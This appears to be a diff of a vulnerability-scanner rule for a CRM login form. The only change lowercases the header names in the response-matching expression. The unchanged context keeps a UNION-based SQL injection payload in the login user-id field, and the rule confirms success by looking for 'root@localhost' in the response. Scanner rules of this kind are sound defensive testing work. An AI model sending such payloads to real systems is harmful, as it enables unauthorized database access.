@@ -27,8 +27,8 @@ rules:
       body: logincrm_userid=-1 union select user(),2,3%23
     expression: |
       response.status == 200 &&
-      response.headers["Content-Type"].contains("text/html") &&
-      response.headers["Server"].contains("Apache") &&
+      response.headers["content-type"].contains("text/html") &&
+      response.headers["server"].contains("Apache") &&
       response.body.bcontains(b'"last_name":"root@localhost"')
 
 expression: r0()
